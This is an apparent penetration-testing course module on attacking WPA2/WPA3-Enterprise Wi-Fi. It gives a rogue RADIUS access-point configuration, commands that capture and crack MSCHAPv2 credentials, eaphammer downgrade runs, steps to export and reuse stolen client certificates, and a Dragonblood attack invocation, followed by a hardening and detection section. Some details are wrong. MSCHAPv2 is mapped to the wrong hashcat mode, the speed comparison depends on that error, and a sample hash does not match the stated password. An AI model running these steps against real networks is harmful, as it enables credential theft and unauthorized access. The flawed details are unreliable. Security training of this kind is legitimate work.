# Module 13 — WPA2/WPA3-Enterprise Attacks

> **Prerequisites:** [Module 09 — Evil Twin Access Points](../module-09-evil-twin/), [Module 12 — PMKID Attack](../module-12-pmkid-attack/)
> **Next Module:** [Module 14 — Full Attack Chains & Automation](../module-14-attack-chaining/)

> **Legal Disclaimer:** Enterprise wireless attacks must only be performed on networks and infrastructure you own or have **explicit written authorization** to test. Unauthorized access to corporate networks violates the CFAA, UK Computer Misuse Act, and numerous other laws worldwide.

---

## Table of Contents

1. [WPA2-Enterprise Architecture](#1-wpa2-enterprise-architecture)
2. [EAP Types and Their Vulnerabilities](#2-eap-types-and-their-vulnerabilities)
3. [Setting Up a Rogue RADIUS Server with hostapd-wpe](#3-setting-up-a-rogue-radius-server-with-hostapd-wpe)
4. [Capturing MSCHAPv2 Credentials](#4-capturing-mschapv2-credentials)
5. [Cracking MSCHAPv2 with asleap and hashcat](#5-cracking-mschapv2-with-asleap-and-hashcat)
6. [PEAP Relay Attacks](#6-peap-relay-attacks)
7. [EAP-TLS Certificate Attacks](#7-eap-tls-certificate-attacks)
8. [WPA3-SAE (Dragonblood) Attacks](#8-wpa3-sae-dragonblood-attacks)
9. [Detection & Countermeasures](#9-detection--countermeasures)
10. [Knowledge Check](#10-knowledge-check)

---

## 1. WPA2-Enterprise Architecture

### Overview

WPA2-Enterprise (IEEE 802.1X) replaces the shared passphrase of WPA2-PSK with **per-user credentials** authenticated through a RADIUS server. Each user has their own username and password (or certificate).

```
┌──────────────┐        ┌──────────────┐        ┌──────────────────┐
│   Supplicant │        │ Authenticator│        │ Authentication   │
│  (client     │ 802.1X │  (AP / NAS)  │ RADIUS │  Server (RADIUS) │
│   device)    │◄──────►│              │◄──────►│  e.g. FreeRADIUS │
└──────────────┘  EAP   └──────────────┘  UDP   └──────────────────┘
                                                         │
                                                  User database
                                              (AD, LDAP, local)
```

### Authentication Flow

1. Client associates with AP (open system authentication at 802.11 level)
2. AP blocks all non-EAP traffic until authentication succeeds (controlled port)
3. AP relays EAP messages between client and RADIUS server
4. RADIUS server validates credentials and sends `Access-Accept` or `Access-Reject`
5. On accept, AP derives per-session encryption keys (PTK/GTK) and opens the port

### Why Enterprise Networks Are Attractive Targets

- A single compromised credential grants network access **as that user**
- Credentials are often **Active Directory** accounts — valid for email, VPN, SharePoint, etc.
- Unlike WPA2-PSK, there is **no shared secret** to prevent access once credentials are known
- Many implementations allow **anonymous outer identity** — the real username is hidden until inner authentication

---

## 2. EAP Types and Their Vulnerabilities

### EAP Method Comparison

| EAP Type | Inner Auth | Server Cert Validated | Attack Vector |
|----------|-----------|----------------------|---------------|
| **PEAP** (Protected EAP) | MSCHAPv2 | Optional (often ignored) | Rogue RADIUS → MSCHAPv2 hash capture |
| **EAP-TTLS** | PAP / MSCHAPv2 | Optional | Same as PEAP |
| **EAP-FAST** | MSCHAPv2 / PAP | Optional / PAC | PAC provisioning attacks |
| **EAP-TLS** | Certificate | Yes (mutual) | Cert theft, stolen private key |
| **EAP-LEAP** (legacy) | MSCHAPv1 | No | Direct offline crack with asleap |

### PEAP-MSCHAPv2 — The Most Common Target

PEAP wraps MSCHAPv2 inside a TLS tunnel. The problem:

1. The TLS tunnel only **authenticates the server** (one-way TLS)
2. Many clients are **misconfigured** to not validate the server certificate
3. An attacker presenting any certificate (even self-signed) will be accepted
4. Once inside the fake TLS tunnel, MSCHAPv2 credentials are transmitted and captured

### MSCHAPv2 Weakness

MSCHAPv2 is fundamentally broken:
- The server sends a **challenge** (16 bytes random)
- The client responds with an **NT hash** of the password, computed using the challenge
- An attacker who captures the challenge + response can crack the **NT hash offline**
- NT hash = MD4(UTF16-LE(password)) — extremely fast to crack on GPU

```
Cracking speed for NT hash on RTX 4090:
~70,000,000,000 H/s (70 billion per second)

At this speed, 8-char alphanumeric passwords crack in seconds.
```

---

## 3. Setting Up a Rogue RADIUS Server with hostapd-wpe

`hostapd-wpe` (Wireless Pwnage Edition) is a patched version of hostapd that acts as both a WPA2-Enterprise AP and a rogue RADIUS server — automatically capturing and logging EAP credentials.

### Installation

```bash
sudo apt install hostapd-wpe
```

### Generate Certificates

```bash
# Navigate to hostapd-wpe cert directory
cd /etc/hostapd-wpe/certs/

# Generate a self-signed CA and server certificate
# (The bootstrap script is included with hostapd-wpe)
sudo bash bootstrap
```

### hostapd-wpe Configuration

Create `/etc/hostapd-wpe/corp-evil.conf`:

```ini
# Interface and driver
interface=wlan1
driver=nl80211

# Match the target enterprise SSID exactly
ssid=CorpWiFi

# Radio settings
hw_mode=g
channel=6

# WPA2-Enterprise mode
auth_algs=3
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP

# EAP server configuration
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user

# Certificates
ca_cert=/etc/hostapd-wpe/certs/ca.pem
server_cert=/etc/hostapd-wpe/certs/server.pem
private_key=/etc/hostapd-wpe/certs/server.key
private_key_passwd=whatever

# Credential logging
hostapd_wpe_log_file=/var/log/hostapd-wpe.log
```

### Running hostapd-wpe

```bash
sudo hostapd-wpe /etc/hostapd-wpe/corp-evil.conf

# Expected output when client connects:
# hostapd-wpe: mschapv2 captured
#   username: alice@corp.com
#   challenge: 5d9b4b1f3a2e7c8d:00f7a892b1c3d4e5
#   response:  a1b2c3d4e5f6a7b8:c9d0e1f2a3b4c5d6:...
```

---

## 4. Capturing MSCHAPv2 Credentials

### What Gets Captured

When a PEAP or EAP-TTLS client authenticates to the rogue RADIUS, `hostapd-wpe` logs:

```
mschapv2:
    username:  alice@corp.com
    challenge: 5d:9b:4b:1f:3a:2e:7c:8d
    response:  a1:b2:c3:d4:e5:f6:a7:b8:c9:d0:e1:f2:a3:b4:c5:d6:e7:f8:a9:b0:c1
```

The **challenge** and **response** together form an `NTLM` hash pair crackable offline.

### Log File Analysis

```bash
sudo tail -f /var/log/hostapd-wpe.log

# Multiple captures:
[2024-03-15 14:23:01] mschapv2: username=alice@corp.com
  challenge=5d9b4b1f3a2e7c8d response=a1b2c3d4e5f6a7b8...
[2024-03-15 14:25:11] mschapv2: username=bob.smith
  challenge=11223344aabbccdd response=998877665544332211...
```

### Parsing for hashcat Format

hashcat mode **5500** (NetNTLMv1) and **5600** (NetNTLMv2) crack MSCHAPv2 credentials:

```bash
# Format for hashcat -m 5500 (NTLMv1 / MSCHAPv1):
# username::domain:challenge:response:response

# Format for hashcat -m 5600 (NTLMv2 / MSCHAPv2):
# username::domain:ServerChallenge:NTProofStr:blob

# Parse hostapd-wpe log automatically:
# (Use the companion script included with hostapd-wpe)
hostapd-wpe-joiner --log /var/log/hostapd-wpe.log > hashes_ntlm.txt
```

---

## 5. Cracking MSCHAPv2 with asleap and hashcat

### asleap

`asleap` is purpose-built for cracking EAP-LEAP and MSCHAPv2 credentials. It reads directly from hostapd-wpe log format.

```bash
sudo apt install asleap

# Crack using challenge + response directly
sudo asleap \
  -C 5d:9b:4b:1f:3a:2e:7c:8d \
  -R a1:b2:c3:d4:e5:f6:a7:b8:c9:d0:e1:f2:a3:b4:c5:d6:e7:f8:a9:b0:c1 \
  -W /usr/share/wordlists/rockyou.txt

# Output on success:
# username: alice@corp.com
# NT hash: 8846f7eaee8fb117ad06bdd830b7586c
# password: Summer2024!
```

### hashcat MSCHAPv2 (Mode 5600)

```bash
# Format the hash for hashcat
# username::domain:challenge:response
echo 'alice::CORP:5d9b4b1f3a2e7c8d:a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0:0101...' \
  > mschapv2.hash

# Crack
hashcat -m 5600 mschapv2.hash /usr/share/wordlists/rockyou.txt

# Rule attack
hashcat -m 5600 mschapv2.hash rockyou.txt -r rules/best64.rule
```

### NT Hash Cracking (Mode 1000) — Fastest Path

If you can recover the NT hash (from asleap or pass-the-hash tools), mode 1000 is far faster:

```bash
# NT hash cracking — 70 billion guesses/second on RTX 4090
hashcat -m 1000 8846f7eaee8fb117ad06bdd830b7586c rockyou.txt

# With rules
hashcat -m 1000 8846f7eaee8fb117ad06bdd830b7586c rockyou.txt -r rules/dive.rule
```

### Speed Comparison

| hashcat Mode | Algorithm | Speed (RTX 4090) |
|-------------|-----------|-----------------|
| 22000 | WPA2-PBKDF2 | ~1.2M H/s |
| 5600 | NetNTLMv2 (MSCHAPv2) | ~3,300M H/s |
| 1000 | NT hash (MD4) | ~70,000M H/s |

MSCHAPv2 credentials crack **2,750× faster** than WPA2 PSK.

---

## 6. PEAP Relay Attacks

### What Is PEAP Relay?

A PEAP relay attack uses a rogue AP that relays EAP authentication to the **real RADIUS server**, letting the legitimate server validate credentials — but intercepting session keys in the process.

```
Client ──PEAP──► Rogue AP ──relay──► Real RADIUS Server
                    │                      │
                    │◄── Access-Accept ─────┘
                    │
                    └── Derive keys from known EAP exchange
                        (eapwpe / freeradius-wpe)
```

This is used when:
- Clients properly validate the server certificate (relay uses real cert chain)
- Direct credential capture is blocked
- Goal is network access rather than credential theft

### Tools for PEAP Relay

```bash
# eaphammer supports PEAP relay mode
git clone https://github.com/s0lst1c3/eaphammer.git
cd eaphammer

# Setup
sudo python3 setup.py kali          # For Kali Linux

# PEAP relay attack
sudo python3 eaphammer \
  --interface wlan1 \
  --essid CorpWiFi \
  --channel 6 \
  --wpa 2 \
  --auth peap \
  --creds
```

### EAPHammer Rogue RADIUS

`eaphammer` is a more modern alternative to `hostapd-wpe` with additional features including GTC downgrade attacks:

```bash
# GTC downgrade — trick clients into sending password in cleartext
sudo python3 eaphammer \
  --interface wlan1 \
  --essid CorpWiFi \
  --channel 6 \
  --wpa 2 \
  --auth peap \
  --negotiate gtc-downgrade \
  --creds
```

---

## 7. EAP-TLS Certificate Attacks

EAP-TLS uses **mutual certificate authentication** — both the client and server present certificates. It is the most secure EAP type, but has specific attack vectors.

### Attack Scenarios

| Scenario | Attack |
|----------|--------|
| Stolen client certificate + private key | Authenticate as that user indefinitely |
| Weak certificate validation on client | Rogue AP presents any cert, client connects |
| Certificate not bound to device | Cert extracted from one device, used on another |
| CA compromise | Issue valid certs for any identity |

### Extracting Certificates from Windows

```powershell
# Export a certificate with private key from Windows cert store
# (Requires admin privileges)

# Via certutil:
certutil -exportPFX -p "password123" MY "user@corp.com" user_cert.pfx

# Via PowerShell:
$cert = Get-ChildItem Cert:\CurrentUser\My | Where-Object {$_.Subject -like "*corp.com*"}
Export-PfxCertificate -Cert $cert -FilePath .\cert.pfx -Password (ConvertTo-SecureString "pass" -AsPlainText -Force)
```

### Using a Stolen Certificate

```bash
# Convert PFX to PEM for hostapd / wpa_supplicant
openssl pkcs12 -in user_cert.pfx -out user.pem -nodes -password pass:password123

# Configure wpa_supplicant with stolen cert
cat > /etc/wpa_supplicant/stolen.conf << EOF
network={
    ssid="CorpWiFi"
    key_mgmt=WPA-EAP
    eap=TLS
    identity="alice@corp.com"
    ca_cert="/etc/ssl/certs/corp-ca.pem"
    client_cert="/etc/wpa_supplicant/user.pem"
    private_key="/etc/wpa_supplicant/user.pem"
}
EOF

sudo wpa_supplicant -i wlan0 -c /etc/wpa_supplicant/stolen.conf
```

---

## 8. WPA3-SAE (Dragonblood) Attacks

### WPA3-SAE Overview

WPA3-Personal replaces PSK with **SAE** (Simultaneous Authentication of Equals), also called the Dragonfly handshake. Key properties:

- **Forward secrecy** — compromising the password does not decrypt old traffic
- **No offline dictionary attacks** — the handshake is interactive; no hash to crack offline
- **Resistance to deauthentication** — clients can detect forged deauth frames

### Dragonblood Vulnerabilities (2019)

Researchers **Mathy Vanhoef and Eyal Ronen** discovered multiple side-channel vulnerabilities in the SAE handshake:

| CVE | Type | Description |
|-----|------|-------------|
| CVE-2019-9494 | Cache-based side-channel | Timing leak reveals password bits |
| CVE-2019-9496 | Cryptographic downgrade | SAE confirmation bypass |
| CVE-2019-13377 | Timing side-channel | Brainpool curves leak timing info |
| CVE-2019-13456 | Info leak | EAP-pwd in FreeRADIUS |

### Dragonblood Tool

```bash
# Install dragonslayer (Dragonblood PoC)
git clone https://github.com/vanhoefm/dragonslayer.git
cd dragonslayer
pip3 install -r requirements.txt

# Timing attack to determine if password is in a wordlist
sudo python3 dragonslayer.py \
  --iface wlan0mon \
  --bssid AA:BB:CC:DD:EE:FF \
  --ssid "WPA3Network" \
  --dict /usr/share/wordlists/rockyou.txt \
  --attack timing
```

### WPA3 Downgrade Attacks

Many APs support **WPA3-Transition Mode** (mixed WPA2/WPA3). An attacker can:

1. Deploy a rogue AP advertising only WPA2 (no WPA3)
2. Force a WPA3-capable client to connect using WPA2
3. Capture WPA2 handshake / PMKID → crack offline

```bash
# Check if target AP runs in transition mode
sudo airodump-ng wlan0mon
# Look for APs with both WPA2 and WPA3 flags in AUTH column

# Deploy WPA2-only evil twin to force downgrade
# (Use hostapd config from Module 09 with WPA2-PSK only, same SSID)
```

### Current WPA3 Attack Surface (2024)

| Attack | Status | Mitigation |
|--------|--------|-----------|
| Dragonblood timing (CVE-2019-9494) | Patched in most firmware | Update firmware |
| WPA3 downgrade | Active if transition mode used | WPA3-only mode |
| SAE-PK (SAE with Public Key) | Research stage | Use WPA3-Enterprise |
| Side-channels in SAE curves | Partially patched | Update firmware |

---

## 9. Detection & Countermeasures

### Supplicant Hardening (Critical)

The single most important countermeasure is **configuring supplicants to validate the RADIUS server certificate**:

```ini
# /etc/wpa_supplicant/corp.conf — hardened PEAP config
network={
    ssid="CorpWiFi"
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="alice@corp.com"
    password="Summer2024!"
    phase1="peaplabel=0"
    phase2="auth=MSCHAPV2"

    # CRITICAL: validate server certificate
    ca_cert="/etc/ssl/certs/corp-radius-ca.pem"
    subject_match="/CN=radius.corp.com"

    # Reject any server cert not matching the pinned CA
    # This blocks ALL rogue RADIUS server attacks
}
```

### Windows Supplicant Hardening

```powershell
# Force certificate validation via Group Policy:
# Computer Config → Policies → Windows Settings → Security Settings
# → Wireless Network (IEEE 802.11) Policies
# → PEAP → Validate server certificate: ENABLED
# → Trusted root CAs: select your internal CA

# Or via netsh:
netsh wlan set profileparameter name="CorpWiFi" \
      connectiontype=ESS \
      authentication=WPA2Enterprise \
      encryption=AES
```

### Network-Side Detections

| Detection | Method |
|-----------|--------|
| Rogue AP with corp SSID | WIDS/WIPS alert on duplicate SSID |
| Auth failures against real RADIUS | Spike in EAP-Failure events in RADIUS logs |
| Unknown client MAC | 802.1X + MAC ACL + certificate-based auth |
| Deauth bursts preceding EAP | Correlate deauth and EAP failure events in SIEM |

### Deployment Recommendations

| Recommendation | Priority |
|---------------|----------|
| Enforce RADIUS CA validation on all supplicants | Critical |
| Use EAP-TLS (certificates) instead of PEAP-MSCHAPv2 | High |
| Migrate to WPA3-Enterprise | High |
| Enable WIPS with rogue AP detection | High |
| Deploy Network Access Control (NAC) | Medium |

---

## 10. Knowledge Check

Before proceeding to Module 14, you should be able to answer:

1. Describe the WPA2-Enterprise authentication architecture. What is the role of each component: supplicant, authenticator, and RADIUS server?
2. Why is PEAP-MSCHAPv2 vulnerable to rogue RADIUS server attacks even when TLS is used?
3. Write the key sections of a `hostapd-wpe` configuration file that creates a rogue WPA2-Enterprise AP for the SSID `CorpWiFi` on channel 6.
4. What three values does `hostapd-wpe` log when a PEAP client authenticates, and how are they used for offline cracking?
5. Why does MSCHAPv2 crack approximately 2,750 times faster than WPA2-PSK in hashcat?
6. What is a GTC downgrade attack and what is the attacker's goal?
7. What are two attack scenarios against EAP-TLS, and why is this EAP type generally considered more secure than PEAP?
8. What is the Dragonblood vulnerability and which CVE introduced a cache-based side-channel against WPA3-SAE?
9. How does a WPA3 downgrade attack work, and what AP configuration prevents it?
10. Write the critical `wpa_supplicant` configuration directives that prevent rogue RADIUS server attacks on a PEAP-MSCHAPv2 network.

---

**Next:** [Module 14 — Full Attack Chains & Automation](../module-14-attack-chaining/)
